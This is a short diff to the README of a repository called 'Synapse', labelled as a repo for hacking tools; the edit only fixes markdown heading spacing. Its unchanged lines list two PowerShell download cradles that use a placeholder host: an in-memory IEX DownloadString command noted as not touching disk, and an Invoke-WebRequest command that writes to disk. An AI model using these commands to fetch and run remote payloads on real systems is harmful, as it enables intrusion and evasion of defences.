@@ -1,9 +1,9 @@
 # Synapse
 ##Repo for hacking tools
 
-#Get files
-##IEX (Doesnt touch disk)
+# Get files
+## IEX (Doesnt touch disk)
 `IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`
 
-##Write to disk
+## Write to disk
 `invoke-webrequest -Uri http://xxxxx:9000/somefile -OutFile somefile`
